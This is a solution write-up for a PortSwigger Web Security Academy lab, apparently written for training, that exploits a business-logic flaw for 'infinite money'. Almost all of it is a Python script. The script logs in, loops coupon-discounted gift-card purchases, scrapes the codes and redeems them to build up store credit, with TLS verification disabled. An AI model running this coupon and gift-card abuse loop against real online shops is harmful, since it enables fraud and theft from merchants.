# Lab: Infinite money logic flaw

Link to lab: https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-infinite-money

## Solution

```python
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup

url = 'https://0a6f001f04312f0fc340fbd700ac0064.web-security-academy.net'


# Get login

response = requests.get(url+'/login')

soup = BeautifulSoup(response.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'})['value']
session = response.headers['Set-Cookie'].split(';')[0].split('=')[1]


# Post login
cookies = {
    'session': session,
}

data = {
    'csrf': csrf,
    'username': 'wiener',
    'password': 'peter',
}

response = requests.post(
    url+'/login',
    cookies=cookies,
    data=data,
    verify=False,
    allow_redirects=False
)

session = response.headers['Set-Cookie'].split(';')[0].split('=')[1]

# Get home page
cookies = {
    'session': session,
}
response = requests.get(
    url,
    cookies=cookies,
    verify=False,
)
soup = BeautifulSoup(response.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'})['value']


last_codes = []
for i in range(300):
    print(i)

    # Post item to cart

    data = {
        'productId': '2',
        'redir': 'PRODUCT',
        'quantity': '1',
    }

    response = requests.post(
        url+'/cart',
        cookies=cookies,    
        data=data,
        verify=False,
    )
    # Post coupon

    data = {
        'csrf': csrf,
        'coupon': 'SIGNUP30',
    }

    response = requests.post(
        url+'/cart/coupon',
        cookies=cookies,
        data=data,
        verify=False,
        )



    # Post checkout
    data = {
        'csrf': csrf,
    }
    response = requests.post(
        url+'/cart/checkout',
        cookies=cookies,
        data=data,
        verify=False,
    )

    soup = BeautifulSoup(response.text, 'html.parser')
    td_tags = soup.find('table', {'class': 'is-table-numbers'})

    current_codes = []
    for row in td_tags.find_all('tr')[1:]:
        code = row.find('td').text.strip()
        current_codes.append(code)

    c = list(set(current_codes) ^ set(last_codes))

    last_codes = current_codes

    # post Redeem
    data = {
        'csrf': csrf,
        'gift-card': c,
    }
    response = requests.post(
        url+'/gift-card',
        cookies=cookies,
        data=data,
        verify=False,
    )

#Get jacket

data = {
    'productId': '1',
    'redir': 'PRODUCT',
    'quantity': '1',
}

response = requests.post(
    url+'/cart',
    cookies=cookies,    
    data=data,
    verify=False,
)
# Post coupon

data = {
    'csrf': csrf,
    'coupon': 'SIGNUP30',
}

response = requests.post(
    url+'/cart/coupon',
    cookies=cookies,
    data=data,
    verify=False,
    )



# Post checkout
data = {
    'csrf': csrf,
}
response = requests.post(
    url+'/cart/checkout',
    cookies=cookies,
    data=data,
    verify=False,
)


```